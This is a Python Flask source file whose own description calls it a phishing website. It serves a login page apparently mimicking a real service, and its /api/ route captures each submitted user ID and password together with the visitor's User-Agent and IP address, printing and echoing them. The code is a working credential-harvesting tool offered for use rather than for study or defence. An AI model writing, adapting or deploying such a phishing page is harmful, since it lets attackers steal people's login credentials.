'''
Author: whalefall
Date: 2021-04-04 01:56:10
LastEditTime: 2021-04-04 04:03:33
Description: Flask框架钓鱼网站
'''
from flask import *
import os

app = Flask(__name__)

app.config.from_pyfile(os.path.join(
    os.path.abspath(os.path.dirname(__file__)), "config.py"))


@app.route('/', methods=["GET", "POST"])
def index():
    return render_template('index.html')


@app.route('/KsLoginAction.html/', methods=["GET", "POST"])
def login_index():
    return render_template('KsLoginAction.html')


@app.route('/api/', methods=["GET", "POST"])
def loginAPI():
    # print(request.method)

    if request.method == "GET":
        data = request.args
    elif request.method == "POST":

        data = request.form
        print(data)
    else:
        return "只接受GET POST请求"

    if data == None:
        return "请传入请求参数 --彩蛋 我喜欢黄颖怡 希望和她一所高中"

    userid = data.get("userid")
    pwd = data.get("password")
    ua = request.headers.get('User-Agent')
    ip = request.remote_addr

    if userid == "" or userid == None or pwd == "" or pwd == None:
        return "<script>alert('账号或密码为空!')</script>"

    return "%s %s %s %s" % (userid, pwd, ua, ip)


@app.errorhandler(404)
def page_not_found(e):
    return render_template("error.html", title="无法找到该页面", c="无法找到资源,请返回主页")


if __name__ == "__main__":

    app.run(host="0.0.0.0", port=5000, debug=True)
